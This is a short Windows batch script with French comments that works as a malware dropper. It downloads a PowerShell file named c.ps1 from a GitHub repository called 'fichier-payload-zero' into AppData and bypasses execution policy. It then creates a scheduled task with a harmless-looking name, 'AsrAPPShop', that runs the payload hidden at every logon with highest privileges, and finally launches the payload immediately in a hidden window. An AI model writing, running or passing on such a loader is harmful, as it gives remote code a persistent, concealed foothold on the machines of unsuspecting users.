@echo off
REM 1. Téléchargement direct de c.ps1 dans AppData\Roaming
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/skyymat/fichier-payload-zero/refs/heads/main/c.ps1' -OutFile \"$env:APPDATA\c.ps1\" -UseBasicParsing"

REM 2. Création propre et universelle de la tâche planifiée
Schtasks /Create /TN "AsrAPPShop" /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%APPDATA%\c.ps1""" /SC ONLOGON /RL HIGHEST /F

REM 3. Lancement immédiat de la charge utile
start /min powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%APPDATA%\c.ps1"
